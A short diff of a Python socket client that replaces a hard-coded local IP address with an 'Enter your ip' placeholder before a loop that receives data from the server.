@@ -4,7 +4,7 @@ os.system('cls')
 
 
 server = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
-server.connect(('192.168.1.102', 8080))
+server.connect(('Enter your ip', 8080))
 
 while True :
     data = server.recv(2048) 
